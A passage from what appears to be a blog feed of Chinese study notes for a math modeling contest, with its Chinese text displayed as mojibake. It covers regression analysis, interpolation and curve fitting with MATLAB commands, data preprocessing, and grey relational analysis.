ä¸ºç½®ä¿¡åº¦ï¼ˆå³å¤šå¤§æŠŠæ¡å‡è®¾æˆç«‹ï¼‰</p><p>è‹¥ $F&gt;F_{1-\alpha}(1,n-2)$ ï¼Œé›¶å‡è®¾ä¸æˆç«‹ã€‚</p><ol start="2"><li>ræ£€éªŒæ³•</li></ol><p>$$r&#x3D;\frac{\sum_{i&#x3D;1}^{n}(x_{i}-\bar x)(y_{i}-\bar y)}{\sqrt{\sum_{i&#x3D;1}^{n}(x_{i}-\bar x)^{2}\sum_{i&#x3D;1}^{n}(y_{i}-\bar y)^{2}}}$$</p><p>æŸ¥è¡¨ï¼Œå¤§äºæ—¶ï¼Œé›¶å‡è®¾ä¸æˆç«‹ã€‚</p><h1 id="å¤šå…ƒçº¿æ€§å›å½’"><a href="#å¤šå…ƒçº¿æ€§å›å½’" class="headerlink" title="å¤šå…ƒçº¿æ€§å›å½’"></a>å¤šå…ƒçº¿æ€§å›å½’</h1><p>æˆ‘ä»¬ä¸€èˆ¬ç§°æ¨¡å‹<br>$$\begin{cases} Y&#x3D;X\beta+\varepsilon \\ E(\varepsilon)&#x3D;0,COV(\varepsilon,\varepsilon)&#x3D;\sigma^{2}I_{n} \end{cases}$$</p><p>ä¸ºé«˜æ–¯-é©¬å°”å¯å¤«çº¿æ€§æ¨¡å‹ï¼ˆkå…ƒçº¿æ€§å›å½’æ¨¡å‹ï¼‰ï¼Œç®€è®°ä¸º $(Y,X\beta,\sigma^{2}I_{n})$</p><p><img src="/Pictures/MCM/RA/plot01.png" alt="img"></p><p>$y&#x3D;\beta_{0}+\sum_{i&#x3D;1}^{n}\beta_{i}x_{i}$ ç§°ä¸ºå›å½’å¹³é¢æ–¹ç¨‹</p><hr><p>å¤šé¡¹å¼å›å½’</p><p>è®¾å˜é‡Xã€Yçš„å›å½’æ¨¡å‹ä¸ºï¼š</p><p>$$Y&#x3D;\beta_{0}+\beta_{1}x+\beta_{2}x^{2}+\ldots+\beta_{p}x^{p}+\varepsilon$$</p><p>å…¶ä¸­på·²çŸ¥ï¼Œ $\varepsilon$ æœä»æ­£æ€åˆ†å¸ƒã€‚</p><p>ä»¤ $x_{i}&#x3D;x^{i}$ ï¼Œå¯ä»¥è½¬åŒ–ä¸ºå¤šå…ƒçº¿æ€§å›å½’æ¨¡å‹ã€‚</p><h2 id="æ¨¡å‹å‚æ•°ä¼°è®¡"><a href="#æ¨¡å‹å‚æ•°ä¼°è®¡" class="headerlink" title="æ¨¡å‹å‚æ•°ä¼°è®¡"></a>æ¨¡å‹å‚æ•°ä¼°è®¡</h2><p>ç”¨æœ€å°äºŒä¹˜æ³•æ±‚ $\beta_{0},\ldots,\beta_{k}$ çš„ä¼°è®¡é‡ï¼Œä½œç¦»å·®å¹³æ–¹å’Œï¼š</p><p>$$Q&#x3D;\sum_{i&#x3D;1}^{n}(y_{i}-\beta_{0}-\beta_{1}x_{i1}-\ldots-\beta_{k}x_{ik})$$</p><p>é€‰æ‹©åˆé€‚çš„ $\beta_{0},\ldots,\beta_{k}$ ä½¿Qå–æœ€å°å€¼</p><p>è§£å¾—ä¼°è®¡å€¼ä¸º $\hat \beta&#x3D;(X^{T}X)^{-1}(X^{T}Y)$ ï¼ˆå‘é‡å¼ï¼‰</p><p>å°†æ±‚å‡ºçš„ $\hat \beta_{i}$ ä»£å…¥å¹³é¢æ–¹ç¨‹å¾—åˆ°å›å½’æ–¹ç¨‹ã€‚</p><h2 id="çº¿æ€§æ¨¡å‹å’Œå›å½’ç³»æ•°çš„æ£€éªŒ"><a href="#çº¿æ€§æ¨¡å‹å’Œå›å½’ç³»æ•°çš„æ£€éªŒ" class="headerlink" title="çº¿æ€§æ¨¡å‹å’Œå›å½’ç³»æ•°çš„æ£€éªŒ"></a>çº¿æ€§æ¨¡å‹å’Œå›å½’ç³»æ•°çš„æ£€éªŒ</h2><p>æˆ‘ä»¬ä¾ç„¶å¯ä½¿ç”¨<em>F</em>æ£€éªŒæ³•ã€‚</p><p>$$F&#x3D;\frac{U&#x2F;k}{Q_{e}&#x2F;(n-k-1)} ~ F(k,n-k-1)$$</p><p>å…¶ä¸­ $U&#x3D;\sum_{i&#x3D;1}^{n}(\hat y_{i}-\bar y)^{2}$ ï¼ˆå›å½’å¹³æ–¹å’Œï¼‰</p><p>$Q_{e}&#x3D;\sum_{i&#x3D;0}^{n}(y_{i}-\hat y_{i})^{2}$ ï¼ˆæ®‹å·®å¹³æ–¹å’Œï¼‰</p><p>$1-\alpha$ ä¸ºç½®ä¿¡åº¦ï¼ˆå³å¤šå¤§æŠŠæ¡å‡è®¾æˆç«‹ï¼‰</p><p>è‹¥ $F&gt;F_{1-\alpha}(1,n-2)$ ï¼Œé›¶å‡è®¾ä¸æˆç«‹ã€‚</p><h1 id="é€æ­¥å›å½’åˆ†æ"><a href="#é€æ­¥å›å½’åˆ†æ" class="headerlink" title="é€æ­¥å›å½’åˆ†æ"></a>é€æ­¥å›å½’åˆ†æ</h1><p>åœ¨å»ºç«‹å›å½’æ–¹ç¨‹æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ç»è¿‡ç­›é€‰ï¼Œå‰”é™¤é‚£äº›å¯¹Yå½±å“ä¸æ˜¾è‘—çš„å˜é‡ï¼Œè€Œä¿ç•™å½±å“æ˜¾è‘—çš„å˜é‡æ¥å»ºç«‹å›å½’æ–¹ç¨‹ã€‚</p><p>é€‰æ‹©çš„è¿‡ç¨‹æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ol><li><p>ä»æ‰€æœ‰çš„å˜é‡ç»„åˆçš„å›å½’æ–¹ç¨‹ä¸­é€‰æ‹©æœ€ä¼˜è€…</p></li><li><p>ä»åŒ…å«å…¨éƒ¨å˜é‡çš„å›å½’æ–¹ç¨‹ä¸­é€æ¬¡å‰”é™¤ä¸æ˜¾è‘—å› å­</p></li><li><p>ä»ä¸€ä¸ªå˜é‡å¼€å§‹ï¼ŒæŠŠå˜é‡é€ä¸ªå¼•å…¥æ–¹ç¨‹</p></li><li><p>æœ‰è¿›æœ‰å‡ºé€æ­¥å›å½’åˆ†æ</p></li></ol><p>ä¸€èˆ¬æˆ‘ä»¬é€‰ç”¨ç¬¬å››ç§æ–¹æ³•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>RA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ’å€¼ä¸æ‹Ÿåˆ</title>
    <link href="/2024/01/30/%E6%8F%92%E5%80%BC%E4%B8%8E%E6%8B%9F%E5%90%88/"/>
    <url>/2024/01/30/%E6%8F%92%E5%80%BC%E4%B8%8E%E6%8B%9F%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="æ’å€¼é—®é¢˜"><a href="#æ’å€¼é—®é¢˜" class="headerlink" title="æ’å€¼é—®é¢˜"></a>æ’å€¼é—®é¢˜</h1><p>å½“æˆ‘ä»¬é‡åˆ°â€œå·²çŸ¥å‡½æ•°åœ¨æŸåŒºé—´å†…è‹¥å¹²ç‚¹å¤„çš„å€¼ï¼Œæ±‚å‡½æ•°åœ¨è¯¥åŒºé—´ï¼ˆåŸŸï¼‰å†…å…¶ä»–ç‚¹å¤„çš„å€¼â€è¿™ç§é—®é¢˜ä½¿ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨æ’å€¼æ³•è§£å†³ã€‚</p><p>å¸¸ç”¨çš„æ’å€¼æ³•æœ‰<em>Lagrangeæ’å€¼æ³•</em>å’Œ<em>Newtonæ’å€¼æ³•</em>ã€‚</p><h2 id="Lagrangeæ’å€¼æ³•"><a href="#Lagrangeæ’å€¼æ³•" class="headerlink" title="Lagrangeæ’å€¼æ³•"></a>Lagrangeæ’å€¼æ³•</h2><p>æ‹‰æ ¼æœ—æ—¥æ’å€¼å…¬å¼æŒ‡çš„æ˜¯åœ¨èŠ‚ç‚¹ä¸Šç»™å‡ºèŠ‚ç‚¹åŸºå‡½æ•°ï¼Œç„¶ååšåŸºå‡½æ•°çš„çº¿æ€§ç»„åˆï¼Œç»„åˆç³»æ•°ä¸ºèŠ‚ç‚¹å‡½æ•°å€¼çš„ä¸€ç§æ’å€¼å¤šé¡¹å¼ã€‚</p><p>$$f(x)&#x3D;\sum_{i&#x3D;0}^{k}y_{i}\prod_{j\ne i}\frac{x-x_{j}}{x_{i}-x_{j}}$$</p><p>åœ¨é«˜æ¬¡æ’å€¼æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘é«˜æ¬¡æ’å€¼çš„<strong>Rungeç°è±¡</strong></p><p>å½“æ’å€¼æ¬¡æ•°è¶…è¿‡ä¸ƒæ¬¡æ—¶ï¼Œæ’å€¼å¤šé¡¹å¼ä¼šå‡ºç°ä¸¥é‡çš„æŒ¯è¡ç°è±¡ï¼Œç§°ä¸ºRungeç°è±¡ã€‚</p><p><img src="/Pictures/MCM/%E6%8F%92%E5%80%BC/plot01.png" alt="img"></p><p>é¿å…æ–¹æ³•ä¸ºï¼šå°†æ’å€¼åŒºé—´åˆ†ä¸ºè‹¥å¹²å°åŒºé—´ï¼Œåœ¨å°åŒºé—´å†…ç”¨ä½æ¬¡æ’å€¼</p><h2 id="MATLABçš„ä½¿ç”¨"><a href="#MATLABçš„ä½¿ç”¨" class="headerlink" title="MATLABçš„ä½¿ç”¨"></a>MATLABçš„ä½¿ç”¨</h2><p>åŸºæœ¬å‘½ä»¤ï¼š</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">yi=interp1(x,y,xi,<span class="hljs-string">&#x27;method&#x27;</span>) <span class="hljs-comment">%ä¸€ç»´æ’å€¼</span><br><br>zi=interp2(x,y,z,xi,yi,<span class="hljs-string">&#x27;method&#x27;</span>) <span class="hljs-comment">%äºŒç»´æ’å€¼</span><br></code></pre></td></tr></table></figure><p>x,yä¸ºæ’å€¼ç‚¹ï¼Œxi,yiä¸ºè¢«æ’å€¼ç‚¹å’Œæ’å€¼ç»“æœ,é€šå¸¸ä¸ºå‘é‡ï¼›â€™methodâ€™è¡¨ç¤ºæ’å€¼æ–¹æ³•ï¼šâ€™nearestâ€™â€”â€”æœ€é‚»è¿‘æ’å€¼ï¼Œâ€™linearâ€™â€”â€”çº¿æ€§æ’å€¼ ï¼Œâ€™splineâ€™â€”â€”ä¸‰æ¬¡æ ·æ¡æ’å€¼ï¼Œ â€˜cubicâ€™â€”â€”ç«‹æ–¹æ’å€¼ã€‚</p><h1 id="æ‹Ÿåˆé—®é¢˜"><a href="#æ‹Ÿåˆé—®é¢˜" class="headerlink" title="æ‹Ÿåˆé—®é¢˜"></a>æ‹Ÿåˆé—®é¢˜</h1><p>æ’å€¼å’Œæ‹Ÿåˆçš„åŒºåˆ«ï¼š</p><ol><li><p>æ’å€¼å‡½æ•°ä¸€å®šè¿‡å·²çŸ¥ç‚¹ï¼Œæ‹Ÿåˆå‡½æ•°ä¸ä¸€å®šè¿‡å·²çŸ¥ç‚¹</p></li><li><p>æ’å€¼ä¸»è¦æ±‚å‡½æ•°å€¼ï¼Œæ‹Ÿåˆä¸»è¦æ±‚å‡½æ•°å…³ç³»</p></li></ol><h2 id="æ‹Ÿåˆçš„è®¡ç®—"><a href="#æ‹Ÿåˆçš„è®¡ç®—" class="headerlink" title="æ‹Ÿåˆçš„è®¡ç®—"></a>æ‹Ÿåˆçš„è®¡ç®—</h2><p>æ›²çº¿æ‹Ÿåˆéœ€è¦è§£å†³å¦‚ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li><p>çº¿å‹çš„é€‰æ‹©ï¼ˆæ ¹æ®æ•£ç‚¹å›¾é€‰æ‹©åˆé€‚çš„å‡½æ•°æ¨¡å‹ï¼‰</p></li><li><p>çº¿å‹ä¸­å‚æ•°çš„è®¡ç®—</p></li></ol><h2 id="MATLABçš„ä½¿ç”¨-1"><a href="#MATLABçš„ä½¿ç”¨-1" class="headerlink" title="MATLABçš„ä½¿ç”¨"></a>MATLABçš„ä½¿ç”¨</h2><ol><li>å¤šé¡¹å¼æ‹Ÿåˆ</li></ol><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">[a,S]=polyfit(x,y,n)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­xå’Œyæ˜¯è¢«æ‹Ÿåˆæ•°æ®çš„è‡ªå˜é‡å’Œå› å˜é‡ï¼Œnä¸ºæ‹Ÿåˆå¤šé¡¹å¼çš„æ¬¡æ•°ï¼Œaä¸ºæ‹Ÿåˆå¤šé¡¹å¼ç³»æ•°æ„æˆçš„å‘é‡ï¼ŒSä¸ºåˆ†ææ‹Ÿåˆæ•ˆæœæ‰€éœ€çš„æŒ‡æ ‡ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>Interpolation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ•°æ®é¢„å¤„ç†</title>
    <link href="/2024/01/29/%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/"/>
    <url>/2024/01/29/%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="æ•°æ®å­˜åœ¨çš„é—®é¢˜"><a href="#æ•°æ®å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="æ•°æ®å­˜åœ¨çš„é—®é¢˜"></a>æ•°æ®å­˜åœ¨çš„é—®é¢˜</h1><ol><li><p>æ•°æ®ä¸ä¸€è‡´</p><blockquote><p>å„ç³»ç»Ÿä¹‹é—´æ•°æ®çš„é‡çº²ä¸ä¸€è‡´</p></blockquote></li><li><p>å™ªå£°æ•°æ®</p><blockquote><p>æ•°æ®ä¸­å­˜åœ¨æ˜æ˜¾é”™è¯¯æˆ–å¼‚å¸¸çš„æ•°æ®ï¼ˆåç¦»æœŸæœ›å€¼ï¼‰</p></blockquote></li><li><p>ç¼ºå¤±å€¼</p><blockquote><p>æ•°æ®è®°å½•å‡ºç°çš„å±€éƒ¨çš„ç¼ºå¤±</p></blockquote></li></ol><h1 id="æ•°æ®é¢„å¤„ç†çš„ä»»åŠ¡"><a href="#æ•°æ®é¢„å¤„ç†çš„ä»»åŠ¡" class="headerlink" title="æ•°æ®é¢„å¤„ç†çš„ä»»åŠ¡"></a>æ•°æ®é¢„å¤„ç†çš„ä»»åŠ¡</h1><ol><li><p>æ•°æ®æ¸…æ´—</p><blockquote><p>å»æ‰æ•°æ®ä¸­çš„å™ªå£°ï¼Œçº æ­£ä¸ä¸€è‡´</p></blockquote></li><li><p>æ•°æ®é›†æˆ</p><blockquote><p>å°†å¤šä¸ªæ•°æ®æºåˆå¹¶æˆä¸€è‡´çš„æ•°æ®å­˜å‚¨ï¼Œæ„æˆä¸€ä¸ªå®Œç¾çš„æ•°æ®é›†ï¼Œå¦‚æ•°æ®ä»“åº“</p></blockquote></li><li><p>æ•°æ®å½’çº¦</p><blockquote><p>é€šè¿‡èšé›†ã€åˆ é™¤å†—ä½™å±æ€§æˆ–èšç±»ç­‰æ–¹æ³•æ¥å‹ç¼©æ•°æ®</p></blockquote></li><li><p>æ•°æ®å˜æ¢</p><blockquote><p>å°†ä¸€ç§æ ¼å¼çš„æ•°æ®è½¬æ¢ä¸ºå¦ä¸€ç§å½¢å¼çš„æ•°æ®</p></blockquote></li></ol><h1 id="åŸºæœ¬æ–¹æ³•"><a href="#åŸºæœ¬æ–¹æ³•" class="headerlink" title="åŸºæœ¬æ–¹æ³•"></a>åŸºæœ¬æ–¹æ³•</h1><ol><li>ç®€å•å‡½æ•°å˜æ¢</li></ol><p>å¦‚æœè¦ä¿æŒæ•°æ®ä¿æŒæ­£æ€åˆ†å¸ƒï¼Œå¦‚æœæä¾›çš„æ•°æ®æ˜¯åæ€çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†æ•°æ®ä»åæ€åˆ†å¸ƒå˜ä¸ºæ­£æ€åˆ†å¸ƒã€‚</p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å¯¹ä¸€ä¾§å–æŒ‡æ•°ã€å¯¹æ•°å‡½æ•°</p><ol start="2"><li>å½’ä¸€åŒ–</li></ol><p>å°†æ•°æ®æ˜ å°„åˆ°åŒºé—´ [-1,1] æˆ– [0,1] ä¹‹é—´ã€‚</p><ul><li>æœ€å°-æœ€å¤§è§„èŒƒåŒ–</li></ul><p>$$x^{\ast} &#x3D; \frac{x-min}{max-min}$$</p><ul><li>é›¶-å‡å€¼è§„èŒƒåŒ–ï¼šå¤„ç†åå¹³å‡æ•°ä¸º0ï¼Œæ ‡å‡†å·®ä¸º1</li></ul><p>$$x^{\ast} &#x3D; \frac{x-\bar x}{\sigma}$$</p><ul><li>å°æ•°å®šæ ‡è§„èŒƒåŒ–ï¼šç§»åŠ¨å°æ•°ç‚¹çš„æ•°ä½ï¼Œkå–å†³äºæœ€å¤§å€¼</li></ul><p>$$x^{\ast}&#x3D; \frac{x}{10^{k}}$$</p><ol start="3"><li>ç¼ºå¤±å€¼å¤„ç†</li></ol><p>ç¼ºå¤±å€¼çš„å¤„ç†å¯åˆ†ä¸ºä¸‰ç±»ï¼šåˆ é™¤è®°å½•ã€æ•°æ®è¡¥å·®å’Œä¸å¤„ç†ã€‚</p><ul><li>æ•°æ®è¡¥å·®ï¼š<ol><li>æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å¹³å‡æ•°ã€ä¸­ä½æ•°ã€ä¼—æ•°è¿›è¡Œè¡¥å·®</li><li>ä½¿ç”¨å›ºå®šå€¼</li><li>æœ€è¿‘é‚»è¡¥å·®ï¼ˆä½¿ç”¨æœ€ç›¸ä¼¼çš„æ•°æ®ï¼‰</li><li>å›å½’æ–¹æ³•ï¼ˆé¢„æµ‹ï¼‰</li><li>æ’å€¼æ³•ï¼ˆåˆ©ç”¨å·²çŸ¥ç‚¹å»ºç«‹æ’å€¼å‡½æ•°ï¼‰</li></ol></li></ul><p>$$f(x)&#x3D;\sum_{i&#x3D;0}^{n}y_{i} \frac{(x-x_{0})\ldots(x-x_{n})}{(x_{i}-x_{0})\ldots(x_{i}-x_{n})}$$</p><ol start="4"><li>å¼‚å¸¸å€¼å¤„ç†<ul><li>åˆ é™¤å«æœ‰å¼‚å¸¸å€¼çš„è®°å½•<blockquote><p>è®¾ç½®é˜ˆå€¼ï¼Œå¤„ç†æ•°æ®ã€‚</p></blockquote></li><li>è§†ä¸ºç¼ºå¤±å€¼</li><li>å¹³å‡å€¼ä¿®æ­£</li><li>ä¸å¤„ç†</li></ul></li></ol><h1 id="ç‰¹å¾å·¥ç¨‹"><a href="#ç‰¹å¾å·¥ç¨‹" class="headerlink" title="ç‰¹å¾å·¥ç¨‹"></a>ç‰¹å¾å·¥ç¨‹</h1><p>å»æ‰æ— ç”¨ç‰¹å¾ï¼Œå»é™¤å†—ä½™ç‰¹å¾ï¼Œåˆ©ç”¨å­˜åœ¨çš„ç‰¹å¾ã€è½¬æ¢ç‰¹å¾ã€å†…å®¹ä¸­çš„ç‰¹å¾ä»¥åŠå…¶ä»–æ•°æ®æºç”Ÿæˆçš„æ–°ç‰¹å¾ï¼Œç„¶åå¯¹ç‰¹å¾è¿›è¡Œè½¬æ¢ï¼Œæœ€åå¯¹ç‰¹å¾è¿›è¡Œå¤„ç†ï¼Œå·²ç¬¦åˆæ¨¡å‹çš„ä½¿ç”¨ã€‚</p><p>ç®€å•æ¥è¯´ï¼Œç‰¹å¾å·¥ç¨‹çš„å¤„ç†æœ‰ä»¥ä¸‹çš„æ­¥éª¤ï¼š</p><ul><li>æ•°æ®é¢„å¤„ç†</li><li>ç‰¹å¾å¤„ç†</li><li>ç‰¹å¾é€‰æ‹©</li></ul><h2 id="ç‰¹å¾é€‰æ‹©"><a href="#ç‰¹å¾é€‰æ‹©" class="headerlink" title="ç‰¹å¾é€‰æ‹©"></a>ç‰¹å¾é€‰æ‹©</h2><ul><li><p>è¿‡æ»¤æ³•ï¼šæŒ‰ç…§å‘æ•£æ€§æˆ–è€…ç›¸å…³æ€§å¯¹å„ä¸ªç‰¹å¾è¿›è¡Œè¯„åˆ†ï¼Œé€šè¿‡é˜ˆå€¼æˆ–è€…å¾…é€‰æ‹©é˜ˆçš„ä¸ªæ•°æ¥é€‰æ‹©ç‰¹å¾</p></li><li><p>åŒ…è£…æ³•ï¼šæ ¹æ®ç›®æ ‡å‡½æ•°ï¼ˆé€šå¸¸æ˜¯é¢„æµ‹æ•ˆæœè¯„åˆ†ï¼‰æ¯æ¬¡é€‰æ‹©è‹¥å¹²é€‰é¡¹æˆ–è€…æ’é™¤è‹¥å¹²é€‰é¡¹</p></li><li><p>åµŒå…¥æ³•ï¼šä½¿ç”¨æœºå™¨å­¦ä¹ çš„æŸäº›ç®—æ³•å’Œæ¨¡å‹è¿›è¡Œè®­ç»ƒï¼Œå¾—åˆ°å„ä¸ªç‰¹å¾çš„æƒå€¼ç³»æ•°ï¼Œå¹¶æ ¹æ®ç³»æ•°ä»å¤§åˆ°å°é€‰æ‹©ç‰¹å¾ã€‚</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>datas</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GRA</title>
    <link href="/2024/01/29/GRA/"/>
    <url>/2024/01/29/GRA/</url>
    
    <content type="html"><![CDATA[<h2 id="ç°è‰²ç³»ç»Ÿçš„æ¦‚å¿µ"><a href="#ç°è‰²ç³»ç»Ÿçš„æ¦‚å¿µ" class="headerlink" title="ç°è‰²ç³»ç»Ÿçš„æ¦‚å¿µ"></a>ç°è‰²ç³»ç»Ÿçš„æ¦‚å¿µ</h2><p><strong>ç°è‰²ç³»ç»Ÿ</strong>è¿™ä¸ªæ¦‚å¿µçš„æ˜¯ç›¸å¯¹äº<strong>ç™½è‰²ç³»ç»Ÿ</strong>å’Œ<strong>é»‘è‰²ç³»ç»Ÿ</strong>è€Œè¨€çš„ã€‚</p><ul><li><p>ç™½è‰²ç³»ç»Ÿæ˜¯æŒ‡ä¸€ä¸ªç³»ç»Ÿçš„å†…éƒ¨ç‰¹å¾æ˜¯å®Œå…¨å·²çŸ¥çš„ï¼Œå³ç³»ç»Ÿçš„ä¿¡æ¯æ˜¯å®Œå…¨å……åˆ†çš„ã€‚</p></li><li><p>é»‘è‰²ç³»ç»Ÿæ˜¯æŒ‡ä¸€ä¸ªç³»ç»Ÿçš„å†…éƒ¨ä¿¡æ¯å¯¹å¤–ç•Œæ¥è¯´æ˜¯ä¸€æ— æ‰€çŸ¥çš„ï¼Œåªèƒ½é€šè¿‡å®ƒä¸å¤–ç•Œçš„è”ç³»æ¥åŠ ä»¥ç ”ç©¶ã€‚</p></li><li><p>ç°è‰²ç³»ç»Ÿä»‹äºä¸¤è€…ä¹‹é—´ï¼Œè¡¨ç¤ºæˆ‘ä»¬åªå¯¹è¯¥ç³»ç»Ÿæœ‰éƒ¨åˆ†äº†è§£ï¼Œç³»ç»Ÿå†…å„å› ç´ é—´æœ‰ä¸ç¡®å®šçš„å…³ç³»ã€‚</p></li></ul><p>ç°è‰²ç³»ç»Ÿçš„åº”ç”¨èŒƒç•´å¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ æ–¹é¢ï¼š</p><ol><li>ç°è‰²å…³è”åˆ†æ</li><li>ç°è‰²é¢„æµ‹ï¼šäººå£ã€ç¾å˜ç­‰</li><li>ç°è‰²å†³ç­–</li><li>ç°è‰²é¢„æµ‹æ§åˆ¶</li></ol><h2 id="ç°è‰²é¢„æµ‹æ³•"><a href="#ç°è‰²é¢„æµ‹æ³•" class="headerlink" title="ç°è‰²é¢„æµ‹æ³•"></a>ç°è‰²é¢„æµ‹æ³•</h2><p>ç°è‰²é¢„æµ‹æ³•æ˜¯ä¸€ç§å¯¹å«æœ‰ä¸ç¡®å®šå› ç´ çš„ç³»ç»Ÿè¿›è¡Œé¢„æµ‹çš„æ–¹æ³•ã€‚</p><p>å…¶æ ¸å¿ƒæ˜¯åœ¨ä¸€å®šèŒƒå›´å†…å˜åŒ–çš„ã€ä¸æ—¶é—´æœ‰å…³çš„ç°è‰²è¿‡ç¨‹è¿›è¡Œé¢„æµ‹ã€‚</p><p>ç°è‰²é¢„æµ‹é€šè¿‡é‰´åˆ«ç³»ç»Ÿå› ç´ ä¹‹é—´å‘å±•è¶‹åŠ¿çš„ç›¸å¼‚ç¨‹åº¦ï¼Œå³è¿›è¡Œå…³è”åˆ†æï¼Œå¹¶å¯¹åŸå§‹æ•°æ®è¿›è¡Œç”Ÿæˆå¤„ç†æ¥å¯»æ‰¾ç³»ç»Ÿå˜åŠ¨çš„è§„å¾‹ï¼Œç”Ÿæˆæœ‰è¾ƒå¼ºè§„å¾‹æ€§çš„æ•°æ®åºåˆ—ï¼Œå»ºç«‹ç›¸åº”çš„å¾®åˆ†æ–¹ç¨‹æ¨¡å‹ã€‚</p><h3 id="ç°è‰²é¢„æµ‹çš„å››ç§å¸¸è§ç±»å‹"><a href="#ç°è‰²é¢„æµ‹çš„å››ç§å¸¸è§ç±»å‹" class="headerlink" title="ç°è‰²é¢„æµ‹çš„å››ç§å¸¸è§ç±»å‹"></a>ç°è‰²é¢„æµ‹çš„å››ç§å¸¸è§ç±»å‹</h3><ol><li><p>ç°è‰²æ—¶é—´åºåˆ—é¢„æµ‹</p><blockquote><p>ç”¨è§‚å¯Ÿåˆ°çš„ååº”é¢„æµ‹å¯¹è±¡ç‰¹å¾çš„æ—¶é—´åºåˆ—æ¥æ„é€ ç°è‰²é¢„æµ‹æ¨¡å‹ï¼Œé¢„æµ‹æœªæ¥æŸä¸€æ—¶åˆ»çš„ç‰¹å¾é‡ï¼Œæˆ–è¾¾åˆ°æŸä¸€ç‰¹å¾é‡çš„æ—¶é—´</p></blockquote></li><li><p>ç•¸å˜é¢„æµ‹</p><blockquote><p>å³é€šè¿‡ç°è‰²æ¨¡å‹é¢„æµ‹å¼‚å¸¸å€¼å‡ºç°çš„æ—¶åˆ»ï¼Œé¢„æµ‹å¼‚å¸¸å€¼ä»€ä¹ˆæ—¶å€™å‡ºç°åœ¨ç‰¹å®šæ—¶åŒºå†…</p></blockquote></li><li><p>ç³»ç»Ÿé¢„æµ‹</p><blockquote><p>é€šè¿‡å¯¹ç³»ç»Ÿè¡Œä¸ºç‰¹å¾æŒ‡æ ‡å»ºç«‹ä¸€ç»„ç›¸äº’å…³è”çš„ç°è‰²é¢„æµ‹æ¨¡å‹ï¼Œé¢„æµ‹ç³»ç»Ÿä¸­ä¼—å¤šå˜é‡ä¹‹é—´çš„ç›¸äº’åè°ƒå…³ç³»çš„å˜åŒ–ã€‚</p></blockquote></li><li><p>æ‹“æ‰‘é¢„æµ‹</p><blockquote><p>å°†åŸå§‹æ•°æ®åšæ›²çº¿ï¼Œåœ¨æ›²çº¿ä¸ŠæŒ‰å®šå€¼å¯»æ‰¾è¯¥å®šå€¼å‘ç”Ÿçš„æ‰€æœ‰æ—¶ç‚¹ï¼Œå¹¶ä»¥è¯¥å®šå€¼ä¸ºæ¡†æ¶ç”Ÿæˆæ—¶ç‚¹æ•°åˆ—ï¼Œå»ºç«‹æ¨¡å‹é¢„æµ‹è¯¥å®šå€¼æ‰€å‘ç”Ÿçš„æ—¶é—´ç‚¹</p></blockquote></li></ol><h2 id="ç°è‰²å…³è”åº¦ä¸ä¼˜åŠ¿åˆ†æ"><a href="#ç°è‰²å…³è”åº¦ä¸ä¼˜åŠ¿åˆ†æ" class="headerlink" title="ç°è‰²å…³è”åº¦ä¸ä¼˜åŠ¿åˆ†æ"></a>ç°è‰²å…³è”åº¦ä¸ä¼˜åŠ¿åˆ†æ</h2><p>æˆ‘ä»¬åˆ†æä¸€ä¸ªç³»ç»Ÿæ—¶ï¼Œéœ€è¦å¯¹ç³»ç»Ÿè¿›è¡Œå› ç´ åˆ†æï¼Œæ‰¾å‡ºä¸»è¦å’Œæ¬¡è¦ã€ä¿ƒè¿›å’ŒæŠ‘åˆ¶ã€æ½œåœ¨å’Œæ˜æ˜¾çš„å› ç´ ã€‚</p><p>äº‹å®ä¸Šï¼Œ<em>å› ç´ ä¹‹é—´å…³è”æ€§å¦‚ä½•ã€å…³è”ç¨‹åº¦å¦‚ä½•é‡åŒ–ç­‰é—®é¢˜</em>æ˜¯ç³»ç»Ÿåˆ†æçš„å…³é”®ã€‚</p><p>å¯¹äºå›å½’åˆ†ææ³•æ¥è¯´ï¼Œç°è‰²å…³è”åº¦ä¸éœ€è¦å¤§é‡çš„æ•°æ®ã€è®¡ç®—é‡è¾ƒå°ã€åå¸¸æƒ…å†µå½±å“å°ã€‚</p><p>ç°è‰²å…³è”åº¦æ˜¯åˆ†æå‘é‡ä¸å‘é‡ã€çŸ©é˜µä¸çŸ©é˜µä¹‹é—´çš„å…³è”åº¦ï¼Œéœ€è¦<strong>é€‰å–å‚è€ƒæ•°æ®ã€‚</strong></p><h3 id="ç°è‰²å…³è”åº¦çš„æ•°å­¦æ¨¡å‹"><a href="#ç°è‰²å…³è”åº¦çš„æ•°å­¦æ¨¡å‹" class="headerlink" 